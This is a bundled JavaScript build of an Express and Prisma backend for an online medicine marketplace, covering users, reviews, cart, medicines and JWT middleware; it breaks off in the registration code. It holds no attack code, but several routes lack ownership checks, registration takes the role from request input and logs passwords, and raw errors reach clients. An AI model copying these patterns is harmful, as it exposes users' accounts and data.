var __getOwnPropNames = Object.getOwnPropertyNames;
var __esm = (fn, res) => function __init() {
  return fn && (res = (0, fn[__getOwnPropNames(fn)[0]])(fn = 0)), res;
};
var __commonJS = (cb, mod) => function __require() {
  return mod || (0, cb[__getOwnPropNames(cb)[0]])((mod = { exports: {} }).exports, mod), mod.exports;
};

// generated/prisma/internal/class.ts
import * as runtime from "@prisma/client/runtime/client";
async function decodeBase64AsWasm(wasmBase64) {
  const { Buffer: Buffer2 } = await import("buffer");
  const wasmArray = Buffer2.from(wasmBase64, "base64");
  return new WebAssembly.Module(wasmArray);
}
function getPrismaClientClass() {
  return runtime.getPrismaClient(config);
}
var config;
var init_class = __esm({
  "generated/prisma/internal/class.ts"() {
    "use strict";
    config = {
      "previewFeatures": [],
      "clientVersion": "7.3.0",
      "engineVersion": "9d6ad21cbbceab97458517b147a6a09ff43aa735",
      "activeProvider": "postgresql",
      "inlineSchema": '// This is your Prisma schema file,\n// learn more about it in the docs: https://pris.ly/d/prisma-schema\n\n// Looking for ways to speed up your queries, or scale easily with your serverless or edge functions?\n// Try Prisma Accelerate: https://pris.ly/cli/accelerate-init\n\ngenerator client {\n  provider = "prisma-client"\n  output   = "../generated/prisma"\n}\n\ndatasource db {\n  provider = "postgresql"\n}\n\nenum Role {\n  CUSTOMER\n  SELLER\n  ADMIN\n}\n\nmodel User {\n  id            String     @id @default(uuid())\n  name          String\n  email         String\n  emailVerified Boolean    @default(false)\n  image         String?\n  createdAt     DateTime   @default(now())\n  updatedAt     DateTime   @updatedAt\n  sessions      Session[]\n  accounts      Account[]\n  role          Role       @default(CUSTOMER)\n  phone         String?\n  status        Boolean    @default(false)\n  medicines     Medicine[]\n  orders        Order[]\n  reviews       Review[]\n  cartItems     CartItem[]\n\n  @@unique([email])\n  @@map("user")\n}\n\nmodel Session {\n  id        String   @id\n  expiresAt DateTime\n  token     String\n  createdAt DateTime @default(now())\n  updatedAt DateTime @updatedAt\n  ipAddress String?\n  userAgent String?\n  userId    String\n  user      User     @relation(fields: [userId], references: [id], onDelete: Cascade)\n\n  @@unique([token])\n  @@index([userId])\n  @@map("session")\n}\n\nmodel Account {\n  id                    String    @id @default(uuid())\n  accountId             String\n  providerId            String\n  userId                String\n  user                  User      @relation(fields: [userId], references: [id], onDelete: Cascade)\n  accessToken           String?\n  refreshToken          String?\n  idToken               String?\n  accessTokenExpiresAt  DateTime?\n  refreshTokenExpiresAt DateTime?\n  scope                 String?\n  password              String?\n  createdAt             DateTime  @default(now())\n  updatedAt             DateTime  @updatedAt\n\n  @@index([userId])\n  @@map("account")\n}\n\nmodel Verification {\n  id         String   @id\n  identifier String\n  value      String\n  expiresAt  DateTime\n  createdAt  DateTime @default(now())\n  updatedAt  DateTime @updatedAt\n\n  @@index([identifier])\n  @@map("verification")\n}\n\nenum OrderStatus {\n  PLACED\n  PROCESSING\n  SHIPPED\n  DELIVERED\n  CANCELLED\n}\n\n// main tables\n\nmodel Category {\n  id        String     @id @default(uuid())\n  name      String     @unique\n  medicines Medicine[]\n}\n\nmodel Medicine {\n  id            String  @id @default(uuid())\n  name          String\n  description   String\n  price         Float\n  manufacturer  String\n  stockQuantity Int     @default(0)\n  image         String?\n\n  category   Category    @relation(fields: [categoryId], references: [id])\n  categoryId String\n  seller     User        @relation(fields: [sellerId], references: [id])\n  sellerId   String\n  orderItems OrderItem[]\n  reviews    Review[]\n\n  createdAt DateTime   @default(now())\n  updatedAt DateTime   @updatedAt\n  cartItems CartItem[]\n}\n\nmodel Order {\n  id              String      @id @default(uuid())\n  totalAmount     Float\n  shippingAddress String\n  status          OrderStatus @default(PLACED)\n\n  customer   User        @relation(fields: [customerId], references: [id])\n  customerId String\n  items      OrderItem[]\n\n  createdAt DateTime @default(now())\n}\n\nmodel OrderItem {\n  id        String @id @default(uuid())\n  quantity  Int\n  unitPrice Float\n\n  order      Order    @relation(fields: [orderId], references: [id])\n  orderId    String\n  medicine   Medicine @relation(fields: [medicineId], references: [id])\n  medicineId String\n}\n\nmodel Review {\n  id      String  @id @default(uuid())\n  rating  Int\n  comment String?\n\n  customer   User     @relation(fields: [customerId], references: [id])\n  customerId String\n  medicine   Medicine @relation(fields: [medicineId], references: [id])\n  medicineId String\n\n  createdAt DateTime @default(now())\n}\n\nmodel CartItem {\n  id       String @id @default(uuid())\n  quantity Int    @default(1)\n  user     User   @relation(fields: [userId], references: [id], onDelete: Cascade)\n  userId   String\n\n  medicine   Medicine @relation(fields: [medicineId], references: [id], onDelete: Cascade)\n  medicineId String\n\n  createdAt DateTime @default(now())\n  updatedAt DateTime @updatedAt\n\n  @@unique([userId, medicineId])\n  @@map("cartItem")\n}\n',
      "runtimeDataModel": {
        "models": {},
        "enums": {},
        "types": {}
      }
    };
    config.runtimeDataModel = JSON.parse('{"models":{"User":{"fields":[{"name":"id","kind":"scalar","type":"String"},{"name":"name","kind":"scalar","type":"String"},{"name":"email","kind":"scalar","type":"String"},{"name":"emailVerified","kind":"scalar","type":"Boolean"},{"name":"image","kind":"scalar","type":"String"},{"name":"createdAt","kind":"scalar","type":"DateTime"},{"name":"updatedAt","kind":"scalar","type":"DateTime"},{"name":"sessions","kind":"object","type":"Session","relationName":"SessionToUser"},{"name":"accounts","kind":"object","type":"Account","relationName":"AccountToUser"},{"name":"role","kind":"enum","type":"Role"},{"name":"phone","kind":"scalar","type":"String"},{"name":"status","kind":"scalar","type":"Boolean"},{"name":"medicines","kind":"object","type":"Medicine","relationName":"MedicineToUser"},{"name":"orders","kind":"object","type":"Order","relationName":"OrderToUser"},{"name":"reviews","kind":"object","type":"Review","relationName":"ReviewToUser"},{"name":"cartItems","kind":"object","type":"CartItem","relationName":"CartItemToUser"}],"dbName":"user"},"Session":{"fields":[{"name":"id","kind":"scalar","type":"String"},{"name":"expiresAt","kind":"scalar","type":"DateTime"},{"name":"token","kind":"scalar","type":"String"},{"name":"createdAt","kind":"scalar","type":"DateTime"},{"name":"updatedAt","kind":"scalar","type":"DateTime"},{"name":"ipAddress","kind":"scalar","type":"String"},{"name":"userAgent","kind":"scalar","type":"String"},{"name":"userId","kind":"scalar","type":"String"},{"name":"user","kind":"object","type":"User","relationName":"SessionToUser"}],"dbName":"session"},"Account":{"fields":[{"name":"id","kind":"scalar","type":"String"},{"name":"accountId","kind":"scalar","type":"String"},{"name":"providerId","kind":"scalar","type":"String"},{"name":"userId","kind":"scalar","type":"String"},{"name":"user","kind":"object","type":"User","relationName":"AccountToUser"},{"name":"accessToken","kind":"scalar","type":"String"},{"name":"refreshToken","kind":"scalar","type":"String"},{"name":"idToken","kind":"scalar","type":"String"},{"name":"accessTokenExpiresAt","kind":"scalar","type":"DateTime"},{"name":"refreshTokenExpiresAt","kind":"scalar","type":"DateTime"},{"name":"scope","kind":"scalar","type":"String"},{"name":"password","kind":"scalar","type":"String"},{"name":"createdAt","kind":"scalar","type":"DateTime"},{"name":"updatedAt","kind":"scalar","type":"DateTime"}],"dbName":"account"},"Verification":{"fields":[{"name":"id","kind":"scalar","type":"String"},{"name":"identifier","kind":"scalar","type":"String"},{"name":"value","kind":"scalar","type":"String"},{"name":"expiresAt","kind":"scalar","type":"DateTime"},{"name":"createdAt","kind":"scalar","type":"DateTime"},{"name":"updatedAt","kind":"scalar","type":"DateTime"}],"dbName":"verification"},"Category":{"fields":[{"name":"id","kind":"scalar","type":"String"},{"name":"name","kind":"scalar","type":"String"},{"name":"medicines","kind":"object","type":"Medicine","relationName":"CategoryToMedicine"}],"dbName":null},"Medicine":{"fields":[{"name":"id","kind":"scalar","type":"String"},{"name":"name","kind":"scalar","type":"String"},{"name":"description","kind":"scalar","type":"String"},{"name":"price","kind":"scalar","type":"Float"},{"name":"manufacturer","kind":"scalar","type":"String"},{"name":"stockQuantity","kind":"scalar","type":"Int"},{"name":"image","kind":"scalar","type":"String"},{"name":"category","kind":"object","type":"Category","relationName":"CategoryToMedicine"},{"name":"categoryId","kind":"scalar","type":"String"},{"name":"seller","kind":"object","type":"User","relationName":"MedicineToUser"},{"name":"sellerId","kind":"scalar","type":"String"},{"name":"orderItems","kind":"object","type":"OrderItem","relationName":"MedicineToOrderItem"},{"name":"reviews","kind":"object","type":"Review","relationName":"MedicineToReview"},{"name":"createdAt","kind":"scalar","type":"DateTime"},{"name":"updatedAt","kind":"scalar","type":"DateTime"},{"name":"cartItems","kind":"object","type":"CartItem","relationName":"CartItemToMedicine"}],"dbName":null},"Order":{"fields":[{"name":"id","kind":"scalar","type":"String"},{"name":"totalAmount","kind":"scalar","type":"Float"},{"name":"shippingAddress","kind":"scalar","type":"String"},{"name":"status","kind":"enum","type":"OrderStatus"},{"name":"customer","kind":"object","type":"User","relationName":"OrderToUser"},{"name":"customerId","kind":"scalar","type":"String"},{"name":"items","kind":"object","type":"OrderItem","relationName":"OrderToOrderItem"},{"name":"createdAt","kind":"scalar","type":"DateTime"}],"dbName":null},"OrderItem":{"fields":[{"name":"id","kind":"scalar","type":"String"},{"name":"quantity","kind":"scalar","type":"Int"},{"name":"unitPrice","kind":"scalar","type":"Float"},{"name":"order","kind":"object","type":"Order","relationName":"OrderToOrderItem"},{"name":"orderId","kind":"scalar","type":"String"},{"name":"medicine","kind":"object","type":"Medicine","relationName":"MedicineToOrderItem"},{"name":"medicineId","kind":"scalar","type":"String"}],"dbName":null},"Review":{"fields":[{"name":"id","kind":"scalar","type":"String"},{"name":"rating","kind":"scalar","type":"Int"},{"name":"comment","kind":"scalar","type":"String"},{"name":"customer","kind":"object","type":"User","relationName":"ReviewToUser"},{"name":"customerId","kind":"scalar","type":"String"},{"name":"medicine","kind":"object","type":"Medicine","relationName":"MedicineToReview"},{"name":"medicineId","kind":"scalar","type":"String"},{"name":"createdAt","kind":"scalar","type":"DateTime"}],"dbName":null},"CartItem":{"fields":[{"name":"id","kind":"scalar","type":"String"},{"name":"quantity","kind":"scalar","type":"Int"},{"name":"user","kind":"object","type":"User","relationName":"CartItemToUser"},{"name":"userId","kind":"scalar","type":"String"},{"name":"medicine","kind":"object","type":"Medicine","relationName":"CartItemToMedicine"},{"name":"medicineId","kind":"scalar","type":"String"},{"name":"createdAt","kind":"scalar","type":"DateTime"},{"name":"updatedAt","kind":"scalar","type":"DateTime"}],"dbName":"cartItem"}},"enums":{},"types":{}}');
    config.compilerWasm = {
      getRuntime: async () => await import("@prisma/client/runtime/query_compiler_fast_bg.postgresql.mjs"),
      getQueryCompilerWasmModule: async () => {
        const { wasm } = await import("@prisma/client/runtime/query_compiler_fast_bg.postgresql.wasm-base64.mjs");
        return await decodeBase64AsWasm(wasm);
      },
      importName: "./query_compiler_fast_bg.js"
    };
  }
});

// generated/prisma/internal/prismaNamespace.ts
import * as runtime2 from "@prisma/client/runtime/client";
var getExtensionContext, NullTypes2, TransactionIsolationLevel, defineExtension;
var init_prismaNamespace = __esm({
  "generated/prisma/internal/prismaNamespace.ts"() {
    "use strict";
    getExtensionContext = runtime2.Extensions.getExtensionContext;
    NullTypes2 = {
      DbNull: runtime2.NullTypes.DbNull,
      JsonNull: runtime2.NullTypes.JsonNull,
      AnyNull: runtime2.NullTypes.AnyNull
    };
    TransactionIsolationLevel = runtime2.makeStrictEnum({
      ReadUncommitted: "ReadUncommitted",
      ReadCommitted: "ReadCommitted",
      RepeatableRead: "RepeatableRead",
      Serializable: "Serializable"
    });
    defineExtension = runtime2.Extensions.defineExtension;
  }
});

// generated/prisma/enums.ts
var init_enums = __esm({
  "generated/prisma/enums.ts"() {
    "use strict";
  }
});

// generated/prisma/client.ts
import * as path from "path";
import { fileURLToPath } from "url";
var PrismaClient;
var init_client = __esm({
  "generated/prisma/client.ts"() {
    "use strict";
    init_class();
    init_prismaNamespace();
    init_enums();
    init_enums();
    globalThis["__dirname"] = path.dirname(fileURLToPath(import.meta.url));
    PrismaClient = getPrismaClientClass();
  }
});

// src/lib/prisma.ts
import "dotenv/config";
import { PrismaPg } from "@prisma/adapter-pg";
var connectionString, adapter, prisma;
var init_prisma = __esm({
  "src/lib/prisma.ts"() {
    "use strict";
    init_client();
    connectionString = `${process.env.DATABASE_URL}`;
    adapter = new PrismaPg({ connectionString });
    prisma = new PrismaClient({ adapter });
  }
});

// src/modules/Users/user.service.ts
var getAllUsers, updateUser, updateUserByAdmin, deleteUserByAdmin, getAdminStats, getSellerStats, userService;
var init_user_service = __esm({
  "src/modules/Users/user.service.ts"() {
    "use strict";
    init_prisma();
    getAllUsers = async () => {
      const users = await prisma.user.findMany();
      return users;
    };
    updateUser = async (userId, data) => {
      const updateData = {};
      if (data.name) updateData.name = data.name;
      if (data.email) updateData.email = data.email;
      if (data.image) updateData.image = data.image;
      if (data.phone) updateData.phone = data.phone;
      const updatedUser = await prisma.user.update({
        where: { id: userId },
        data: updateData
      });
      return updatedUser;
    };
    updateUserByAdmin = async (userId, data) => {
      const updateData = {};
      if (data.role) updateData.role = data.role;
      if (typeof data.status === "boolean") updateData.status = data.status;
      const updatedUser = await prisma.user.update({
        where: { id: userId },
        data: updateData
      });
      return updatedUser;
    };
    deleteUserByAdmin = async (userId) => {
      const deletedUser = await prisma.user.delete({
        where: { id: userId }
      });
      return deletedUser;
    };
    getAdminStats = async () => {
      const [userCount, medCount, orderCount, revenue] = await Promise.all([
        prisma.user.count(),
        prisma.medicine.count(),
        prisma.order.count(),
        prisma.order.aggregate({ _sum: { totalAmount: true } })
      ]);
      return {
        totalUsers: userCount,
        totalMedicines: medCount,
        totalOrders: orderCount,
        totalRevenue: revenue._sum.totalAmount || 0,
        recentOrders: []
      };
    };
    getSellerStats = async (userId) => {
      const totalMedicines = await prisma.medicine.count({ where: { sellerId: userId } });
      const recentOrders = await prisma.order.findMany({
        where: { items: { some: { medicine: { sellerId: userId } } } },
        take: 5,
        orderBy: { createdAt: "desc" }
      });
      const totalSales = await prisma.order.aggregate({
        where: { items: { some: { medicine: { sellerId: userId } } } },
        _sum: { totalAmount: true }
      });
      const totalAmount = await prisma.medicine.aggregate({
        where: { sellerId: userId },
        _sum: { price: true }
      });
      const revenue = totalSales._sum.totalAmount || 0;
      const medicinePriceTotal = totalAmount._sum.price || 0;
      return {
        totalSales,
        totalMedicines,
        newOrders: recentOrders.length,
        // প্রফিট ক্যালকুলেশনে 0 দিয়ে ভাগ হওয়া এড়াতে চেক:
        profitRate: revenue > 0 ? (medicinePriceTotal - revenue) / revenue * 100 : 0,
        recentOrders,
        totalRevenue: revenue
      };
    };
    userService = {
      getAllUsers,
      updateUser,
      updateUserByAdmin,
      deleteUserByAdmin,
      getAdminStats,
      getSellerStats
    };
  }
});

// src/modules/Users/user.controller.ts
var getAllUsers2, updateUser2, updateUserByAdmin2, deleteUserByAdmin2, getAdminStats2, getSellerStats2, userController;
var init_user_controller = __esm({
  "src/modules/Users/user.controller.ts"() {
    "use strict";
    init_user_service();
    getAllUsers2 = async (req, res) => {
      try {
        const users = await userService.getAllUsers();
        res.status(200).json(users);
      } catch (error) {
        res.status(500).json({ message: "Internal server error", error });
      }
    };
    updateUser2 = async (req, res) => {
      const { id } = req.params;
      try {
        const updatedUser = await userService.updateUser(id, req.body);
        res.status(200).json(updatedUser);
      } catch (error) {
        res.status(500).json({ message: "Internal server error", error });
      }
    };
    updateUserByAdmin2 = async (req, res) => {
      const { id } = req.params;
      const { role, status } = req.body;
      try {
        const updatedUser = await userService.updateUserByAdmin(id, { role, status });
        res.status(200).json(updatedUser);
      } catch (error) {
        res.status(500).json({ message: "Internal server error", error });
      }
    };
    deleteUserByAdmin2 = async (req, res) => {
      const { id } = req.params;
      try {
        const deletedUser = await userService.deleteUserByAdmin(id);
        res.status(200).json(deletedUser);
      } catch (error) {
        res.status(500).json({ message: "Internal server error", error });
      }
    };
    getAdminStats2 = async (req, res) => {
      try {
        const stats = await userService.getAdminStats();
        res.status(200).json(stats);
      } catch (error) {
        res.status(500).json({ message: "Internal server error", error });
      }
    };
    getSellerStats2 = async (req, res) => {
      const userId = req.user.id;
      try {
        const stats = await userService.getSellerStats(userId);
        res.status(200).json(stats);
      } catch (error) {
        res.status(500).json({ message: "Internal server error", error });
      }
    };
    userController = {
      getAllUsers: getAllUsers2,
      updateUser: updateUser2,
      updateUserByAdmin: updateUserByAdmin2,
      deleteUserByAdmin: deleteUserByAdmin2,
      getAdminStats: getAdminStats2,
      getSellerStats: getSellerStats2
    };
  }
});

// src/middleware/isAdmin.middleware.ts
import jwt from "jsonwebtoken";
var isAdmin;
var init_isAdmin_middleware = __esm({
  "src/middleware/isAdmin.middleware.ts"() {
    "use strict";
    isAdmin = (req, res, next) => {
      const authHeader = req.headers.authorization;
      if (!authHeader || !authHeader.startsWith("Bearer ")) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      const token = authHeader.split(" ")[1];
      const decoded = jwt.verify(token, process.env.JWT_SECRET);
      if (decoded.role !== "ADMIN") {
        return res.status(403).json({ message: "Access denied. Only for Admins." });
      }
      next();
    };
  }
});

// src/middleware/checkUserStatus.ts
import jwt2 from "jsonwebtoken";
var isPermitted;
var init_checkUserStatus = __esm({
  "src/middleware/checkUserStatus.ts"() {
    "use strict";
    init_prisma();
    isPermitted = async (req, res, next) => {
      try {
        const authHeader = req.headers.authorization;
        if (!authHeader || !authHeader.startsWith("Bearer ")) {
          return res.status(401).json({ message: "Unauthorized" });
        }
        const token = authHeader.split(" ")[1];
        const decoded = jwt2.verify(token, process.env.JWT_SECRET);
        const userId = decoded?.userId || decoded?.id;
        const user = await prisma.user.findUnique({ where: { id: userId } });
        if (!user) {
          return res.status(404).json({ message: "User not found" });
        }
        if (user?.status === false) {
          return res.status(403).json({ message: "You are banned from this platform!" });
        }
        req.user = user;
        next();
      } catch (error) {
        return res.status(401).json({ message: "Invalid or expired token!" });
      }
    };
  }
});

// src/modules/Users/users.router.ts
import { Router } from "express";
var router, userRouter;
var init_users_router = __esm({
  "src/modules/Users/users.router.ts"() {
    "use strict";
    init_user_controller();
    init_isAdmin_middleware();
    init_checkUserStatus();
    router = Router();
    router.get("/admin/stats", isPermitted, isAdmin, userController.getAdminStats);
    router.get("/seller/stats", isPermitted, userController.getSellerStats);
    router.get("/", isAdmin, userController.getAllUsers);
    router.patch("/:id/role", isPermitted, isAdmin, userController.updateUserByAdmin);
    router.patch("/:id", isPermitted, userController.updateUser);
    router.delete("/:id", isPermitted, isAdmin, userController.deleteUserByAdmin);
    userRouter = router;
  }
});

// src/modules/Reviews/reviews.service.ts
var postReview, getAllReviews, reviewServices;
var init_reviews_service = __esm({
  "src/modules/Reviews/reviews.service.ts"() {
    "use strict";
    init_prisma();
    postReview = async (userId, medicineId, rating, comment) => {
      const hasOrdered = await prisma.order.findFirst({
        where: {
          customerId: userId,
          status: "DELIVERED",
          items: {
            some: {
              medicineId
            }
          }
        }
      });
      if (!hasOrdered) {
        throw new Error("You can only review medicines you have purchased and received.");
      }
      return await prisma.review.create({
        data: {
          customerId: userId,
          medicineId,
          rating,
          comment
        }
      });
    };
    getAllReviews = async () => {
      return await prisma.review.findMany({
        include: {
          customer: true,
          medicine: true
        },
        orderBy: { createdAt: "desc" }
      });
    };
    reviewServices = {
      postReview,
      getAllReviews
    };
  }
});

// src/modules/Reviews/reviews.controller.ts
var postReview2, getAllReviews2, reviewController;
var init_reviews_controller = __esm({
  "src/modules/Reviews/reviews.controller.ts"() {
    "use strict";
    init_reviews_service();
    postReview2 = async (req, res) => {
      try {
        const { userId } = req.user;
        const { medicineId, rating, comment } = req.body;
        const result = await reviewServices.postReview(userId, medicineId, rating, comment);
        res.status(200).json(result);
      } catch (error) {
        res.status(400).json({ error: "Failed to post Medicin", details: error.message });
      }
    };
    getAllReviews2 = async (req, res) => {
      try {
        const reviews = await reviewServices.getAllReviews();
        res.status(200).json(reviews);
      } catch (error) {
        res.status(400).json({ error: "Failed to get reviews", details: error.message });
      }
    };
    reviewController = {
      postReview: postReview2,
      getAllReviews: getAllReviews2
    };
  }
});

// src/middleware/verifyToken.ts
import jwt3 from "jsonwebtoken";
var verifyToken;
var init_verifyToken = __esm({
  "src/middleware/verifyToken.ts"() {
    "use strict";
    verifyToken = (req, res, next) => {
      const token = req.headers.authorization?.split(" ")[1];
      if (!token) {
        return res.status(401).json({
          success: false,
          message: "Token missing!"
        });
      }
      try {
        const decoded = jwt3.verify(token, process.env.JWT_SECRET);
        req.user = decoded;
        next();
      } catch (error) {
        return res.status(401).json({ success: false, message: "Invalid or expired token!" });
      }
    };
  }
});

// src/modules/Reviews/reviews.router.ts
import { Router as Router2 } from "express";
var router2, reviewsRouter;
var init_reviews_router = __esm({
  "src/modules/Reviews/reviews.router.ts"() {
    "use strict";
    init_reviews_controller();
    init_verifyToken();
    init_checkUserStatus();
    router2 = Router2();
    router2.post("/", isPermitted, verifyToken, reviewController.postReview);
    router2.get("/", reviewController.getAllReviews);
    reviewsRouter = router2;
  }
});

// src/modules/cart/cart.service.ts
var addToCart, getCartByUserId, updateOrder, deletOrder, orderServices;
var init_cart_service = __esm({
  "src/modules/cart/cart.service.ts"() {
    "use strict";
    init_prisma();
    addToCart = async (userId, medicineId, quantity) => {
      console.log(userId, medicineId, quantity);
      const medicine = await prisma.medicine.findUnique({
        where: { id: medicineId }
      });
      if (!medicine) {
        throw new Error("Medicine not found!");
      }
      if (medicine.stockQuantity < quantity) {
        throw new Error(`Only ${medicine.stockQuantity} items left in stock!`);
      }
      const existingCartItem = await prisma.cartItem.findUnique({
        where: {
          userId_medicineId: {
            userId,
            medicineId
          }
        }
      });
      if (existingCartItem) {
        return await prisma.cartItem.update({
          where: { id: existingCartItem.id },
          data: {
            quantity: existingCartItem.quantity + quantity
          }
        });
      }
      return await prisma.cartItem.create({
        data: {
          userId,
          medicineId,
          quantity
        }
      });
    };
    getCartByUserId = async (userId) => {
      const cartItems = await prisma.cartItem.findMany({
        where: { userId },
        include: {
          medicine: true
        }
      });
      return cartItems;
    };
    updateOrder = async (id, newQty) => {
      const updatedCartItem = await prisma.cartItem.update({
        where: { id },
        data: { quantity: newQty }
      });
      return updatedCartItem;
    };
    deletOrder = async (orderId) => {
      await prisma.order.delete({
        where: { id: orderId }
      });
      return { success: true, message: "Order deleted successfully." };
    };
    orderServices = {
      addToCart,
      getCartByUserId,
      updateOrder,
      deletOrder
    };
  }
});

// src/modules/cart/cart.controller.ts
var addToCard, getCartByUserId2, updateOrder2, deletOrder2, orderController;
var init_cart_controller = __esm({
  "src/modules/cart/cart.controller.ts"() {
    "use strict";
    init_cart_service();
    addToCard = async (req, res) => {
      try {
        const { medicineId, quantity } = req.body;
        const { userId } = req.user;
        if (!userId) {
          return res.status(401).json({ success: false, message: "User not authenticated!" });
        }
        const result = await orderServices.addToCart(userId, medicineId, quantity);
        res.status(200).json(result);
      } catch (error) {
        res.status(400).json({ error: "Failed to post Medicin", details: error.message });
      }
    };
    getCartByUserId2 = async (req, res) => {
      try {
        const { userId } = req.user;
        const cart = await orderServices.getCartByUserId(userId);
        res.status(200).json(cart);
      } catch (error) {
        res.status(400).json({ error: "Failed to fetch cart", details: error.message });
      }
    };
    updateOrder2 = async (req, res) => {
      try {
        const { id, newQty } = req.params;
        const cart = await orderServices.updateOrder(id, Number(newQty));
        res.status(200).json(cart);
      } catch (error) {
        res.status(400).json({ error: "Failed to update cart", details: error.message });
      }
    };
    deletOrder2 = async (req, res) => {
      try {
        const { orderId } = req.params;
        const result = await orderServices.deletOrder(orderId);
        res.status(200).json(result);
      } catch (error) {
        res.status(400).json({ error: "Failed to delete order", details: error.message });
      }
    };
    orderController = {
      addToCard,
      getCartByUserId: getCartByUserId2,
      updateOrder: updateOrder2,
      deletOrder: deletOrder2
    };
  }
});

// src/modules/cart/cart.router.ts
import { Router as Router3 } from "express";
var router3, cartRouter;
var init_cart_router = __esm({
  "src/modules/cart/cart.router.ts"() {
    "use strict";
    init_cart_controller();
    init_verifyToken();
    init_checkUserStatus();
    router3 = Router3();
    router3.post("/", isPermitted, verifyToken, orderController.addToCard);
    router3.get("/", isPermitted, verifyToken, orderController.getCartByUserId);
    router3.patch("/:id", isPermitted, verifyToken, orderController.updateOrder);
    router3.delete("/:orderId", isPermitted, verifyToken, orderController.deletOrder);
    cartRouter = router3;
  }
});

// src/modules/Medicines/medicines.service.ts
var getAllMedicines, getMedicinById, createMedicine, updateMedicine, deleteMedicine, medicinesService;
var init_medicines_service = __esm({
  "src/modules/Medicines/medicines.service.ts"() {
    "use strict";
    init_prisma();
    getAllMedicines = async (query) => {
      const { search, category, min_price, max_price, manufacturer } = query;
      const andConditions = [];
      if (search) {
        andConditions.push({
          OR: [
            {
              name: {
                contains: search,
                mode: "insensitive"
              }
            },
            {
              manufacturer: {
                contains: search,
                mode: "insensitive"
              }
            },
            {
              description: {
                contains: search,
                mode: "insensitive"
              }
            }
          ]
        });
      }
      if (category) {
        andConditions.push({
          category: {
            name: {
              equals: category,
              mode: "insensitive"
            }
          }
        });
      }
      if (manufacturer) {
        andConditions.push({
          manufacturer: {
            contains: manufacturer,
            mode: "insensitive"
          }
        });
      }
      if (min_price || max_price) {
        andConditions.push({
          price: {
            gte: min_price ? parseFloat(min_price) : void 0,
            lte: max_price ? parseFloat(max_price) : void 0
          }
        });
      }
      const whereConditions = andConditions.length > 0 ? { AND: andConditions } : {};
      const result = await prisma.medicine.findMany({
        where: whereConditions,
        include: {
          category: true,
          seller: {
            select: {
              name: true,
              email: true
            }
          }
        },
        orderBy: {
          createdAt: "desc"
        }
      });
      return result;
    };
    getMedicinById = async (id) => {
      return await prisma.medicine.findUniqueOrThrow({
        where: { id },
        include: {
          category: true,
          seller: true,
          reviews: true,
          orderItems: true
        }
      });
    };
    createMedicine = async (medicineData) => {
      const categoryExists = await prisma.category.findUnique({
        where: { id: medicineData.categoryId }
      });
      if (!categoryExists) {
        throw new Error("Invalid Category ID provided!");
      }
      const result = await prisma.medicine.create({
        data: medicineData
      });
      return result;
    };
    updateMedicine = async (id, medicineData) => {
      const result = await prisma.medicine.update({
        where: {
          id
        },
        data: medicineData
      });
      return result;
    };
    deleteMedicine = async (id) => {
      const result = await prisma.medicine.delete({
        where: {
          id
        }
      });
      return result;
    };
    medicinesService = {
      getAllMedicines,
      getMedicinById,
      createMedicine,
      updateMedicine,
      deleteMedicine
    };
  }
});

// src/modules/Medicines/medicines.controller.ts
var getAllMedicines2, getMedicinById2, createMedicine2, updateMedicine2, deleteMedicine2, medicinController;
var init_medicines_controller = __esm({
  "src/modules/Medicines/medicines.controller.ts"() {
    "use strict";
    init_medicines_service();
    getAllMedicines2 = async (req, res) => {
      try {
        const result = await medicinesService.getAllMedicines(req.query);
        res.status(200).json(result);
      } catch (error) {
        res.status(400).json({ error: "Failed to fetch Medicin", details: error.message });
      }
    };
    getMedicinById2 = async (req, res) => {
      try {
        const id = req.params.medicinId;
        const result = await medicinesService.getMedicinById(id);
        res.status(200).json(result);
      } catch (error) {
        res.status(400).json({
          error: "Failed to fetch medicine dettles",
          details: error.message
        });
      }
    };
    createMedicine2 = async (req, res) => {
      try {
        const user = req.user;
        if (!user || !user.id) {
          return res.status(401).json({ success: false, message: "Seller identity missing" });
        }
        const medicineData = {
          ...req.body,
          price: parseFloat(req.body.price),
          stockQuantity: parseInt(req.body.stockQuantity),
          sellerId: user.id
        };
        const result = await medicinesService.createMedicine(medicineData);
        res.status(201).json({
          success: true,
          message: "Medicine created successfully",
          data: result
        });
      } catch (error) {
        console.error("CREATE ERROR:", error.message);
        res.status(400).json({
          success: false,
          error: "Failed to create medicine",
          details: error.message
        });
      }
    };
    updateMedicine2 = async (req, res) => {
      try {
        const id = req.params.medicinId;
        const medicineData = req.body;
        const result = await medicinesService.updateMedicine(id, medicineData);
        res.status(200).json(result);
      } catch (error) {
        res.status(400).json({ error: "Failed to update medicine", details: error.message });
      }
    };
    deleteMedicine2 = async (req, res) => {
      try {
        const id = req.params.medicinId;
        const result = await medicinesService.deleteMedicine(id);
        res.status(200).json(result);
      } catch (error) {
        res.status(400).json({ error: "Failed to delete medicine", details: error.message });
      }
    };
    medicinController = {
      getAllMedicines: getAllMedicines2,
      getMedicinById: getMedicinById2,
      createMedicine: createMedicine2,
      updateMedicine: updateMedicine2,
      deleteMedicine: deleteMedicine2
    };
  }
});

// src/middleware/seller.middleware.ts
import jwt4 from "jsonwebtoken";
var isSeller;
var init_seller_middleware = __esm({
  "src/middleware/seller.middleware.ts"() {
    "use strict";
    isSeller = (req, res, next) => {
      const authHeader = req.headers.authorization;
      if (!authHeader || !authHeader.startsWith("Bearer ")) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      const token = authHeader.split(" ")[1];
      const decoded = jwt4.verify(token, process.env.JWT_SECRET);
      if (decoded.role !== "SELLER") {
        return res.status(403).json({ message: "Access denied. Only for Sellers." });
      }
      next();
    };
  }
});

// src/modules/Medicines/medicines.router.ts
import { Router as Router4 } from "express";
var router4, medicinesRouter;
var init_medicines_router = __esm({
  "src/modules/Medicines/medicines.router.ts"() {
    "use strict";
    init_medicines_controller();
    init_seller_middleware();
    init_checkUserStatus();
    router4 = Router4();
    router4.get("/", medicinController.getAllMedicines);
    router4.get("/:medicinId", medicinController.getMedicinById);
    router4.post("/", isPermitted, isSeller, medicinController.createMedicine);
    router4.patch("/:medicinId", isPermitted, isSeller, medicinController.updateMedicine);
    router4.delete("/:medicinId", isPermitted, isSeller, medicinController.deleteMedicine);
    medicinesRouter = router4;
  }
});

// src/modules/Auth/auth.service.ts
import bcrypt from "bcrypt";
import jwt5 from "jsonwebtoken";
var regsterUser, loginUser, authService;
var init_auth_service = __esm({
  "src/modules/Auth/auth.service.ts"() {
    "use strict";
    init_prisma();
    regsterUser = async (userData) => {
      const { name, email, password, phone, role } = userData;
      console.log("userData", userData);
      const isUserExist = await prisma.user.findUnique({ where: { email } });
      if (isUserExist) {
